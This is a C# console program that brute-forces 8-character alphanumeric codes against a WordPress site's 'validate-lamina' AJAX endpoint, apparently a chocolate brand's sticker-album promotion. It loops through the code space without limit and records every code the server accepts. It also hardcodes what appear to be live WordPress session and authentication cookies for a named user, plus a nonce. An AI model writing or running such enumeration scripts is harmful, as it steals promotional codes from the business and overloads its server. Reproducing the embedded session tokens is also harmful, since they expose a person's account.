using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

namespace AlbumJET
{
    internal class Program
    {
        static ReaderWriterLock locker = new ReaderWriterLock();
        const string dict = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        static List<int> positions = new List<int>() {
                0,
                0,
                0,
                0,
                0,
                17,
                8,
                21
            };

        static void Main(string[] args)
        {
            File.Delete("Results.txt");
            MainAsync(args).Wait();
        }

        static async Task MainAsync(string[] args)
        {
            string code;
            while (true)
            {
                code = "";
                foreach (var position in positions)
                {
                    code += dict[position];
                }

                var result = await CallPostMethod(code);
                var text = code + " - " + string.Join(",", positions);
                Console.WriteLine(text +" - " + result);

                if (result != "false")
                {
                    try
                    {
                        locker.AcquireWriterLock(int.MaxValue); 
                        File.AppendAllLines("Results.txt", new[] { text });
                    }
                    finally
                    {
                        locker.ReleaseWriterLock();
                    }
                }

                UpdatePositions(7);
            }
        }

        static async Task<string> CallPostMethod(string code)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Clear();
            httpClient.DefaultRequestHeaders.Add("Cookie", "wordpress_sec_ad99e73864f1a5a2074b92e4a69f9a60=erickvelasco%7C1660529912%7CP57bCuInJzClUQdk2ZYPIXz3kp2cEeQH4gEnq1K0rhO%7C14a7b394bf63cc3945b64e3424dfe2ab96d7111c8c81ee34489a35e860068b93; _ga=GA1.2.2108197385.1660097785; _gid=GA1.2.2058711480.1660097785; _ym_uid=1660097787662420379; _ym_d=1660097787; _ym_isad=2; _ga=GA1.3.2108197385.1660097785; _gid=GA1.3.2058711480.1660097785; jet_cookieprehome=true; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_ad99e73864f1a5a2074b92e4a69f9a60=erickvelasco%7C1660529912%7CP57bCuInJzClUQdk2ZYPIXz3kp2cEeQH4gEnq1K0rhO%7Cd370f0f21279d29ccdd9480797a3fbb92dca146e4f688addb9b4bce3c4d9ea0d; wfwaf-authcookie-dec7f1e38c2ac0eaa4c1bc20c9d2ce0c=95912%7Csubscriber%7Cread%7C7194ffad417f4f7001c49d970ce1e4c03cd1914c4e729573612233889ce118ba");
            var request = new Request()
            {
                action = "validate-lamina",
                nonce = "bf54e1c0ec",
                code = code,
                id = 667,
                subcategory = 645,
            };

            var dict = request.ToDictionary<string>();
            var response = await httpClient.PostAsync("https://album.chocolatesjet.com/wp-admin/admin-ajax.php", new FormUrlEncodedContent(dict));
            var result = await response.Content.ReadAsStringAsync();
            return result;
        }

        static void UpdatePositions(int position)
        {
            if (positions[position] == dict.Length - 1)
            {
                positions[position] = 0;
                UpdatePositions(position - 1);
            }
            else
            {
                positions[position]++;
            }
        }
    }
}
